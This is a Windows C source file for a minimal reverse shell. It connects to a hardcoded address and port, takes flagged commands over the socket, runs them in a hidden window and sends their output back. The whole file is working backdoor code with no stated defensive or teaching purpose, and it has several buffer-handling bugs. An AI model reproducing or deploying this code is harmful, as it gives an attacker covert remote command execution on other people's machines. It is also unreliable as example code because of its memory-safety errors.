#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma warning(disable : 4996)
#pragma comment (lib, "ws2_32.lib")
#define BUFFSIZE 1024
#define IPADDR "127.0.0.1"
#define PORT 12345


int execmd(WCHAR *cmd, char *buf);

int execmd(WCHAR *cmd, char *buffer)
{
	SECURITY_ATTRIBUTES   sa;
	HANDLE   hRead, hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return   1;
	}

	STARTUPINFO   si;
	PROCESS_INFORMATION   pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;  
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		return   1;
	}
	CloseHandle(hWrite);

	DWORD   bytesRead = 0;
	ZeroMemory(buffer, sizeof(buffer));
	while (true)
	{
		if (ReadFile(hRead, buffer, BUFFSIZE * 10, &bytesRead, NULL) == NULL)
			break; 
	}
	return   0;
}

int main(int argc, char const *argv[])

{
	char s[BUFFSIZE] = { 0 };
	char flag[5] = { 0 };
	char cmd[BUFFSIZE];
	char result[BUFFSIZE * 10];
	WCHAR cmd_w[BUFFSIZE] = { 0 };
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN addrs;
	memset(&addrs, 0, sizeof(addrs));
	addrs.sin_family = PF_INET;
	addrs.sin_addr.s_addr = inet_addr(IPADDR);
	addrs.sin_port = htons(PORT);
	connect(sock, (SOCKADDR*)&addrs, sizeof(SOCKADDR));

	while (1) {
		ZeroMemory(cmd, sizeof(cmd));
		ZeroMemory(s, sizeof(s));
		ZeroMemory(result, sizeof(s));
		recv(sock, s, BUFFSIZE, NULL);
		strncpy(flag, s, 3);
		strncpy(cmd, s + 3, strlen(s) - 3);
		printf("[+]flag: %s\n", flag);
		printf("[+]cmd: %s\n", cmd);
		if (!strcmp(flag, "001")) {
			MultiByteToWideChar(CP_ACP, 0, cmd, BUFFSIZE, cmd_w, BUFFSIZE * 2);
			execmd(cmd_w, result);
			send(sock, result, strlen(result)+sizeof(char), 0);
			puts(result);
		}
	}
	closesocket(sock);
	WSACleanup();
	return 0;
}
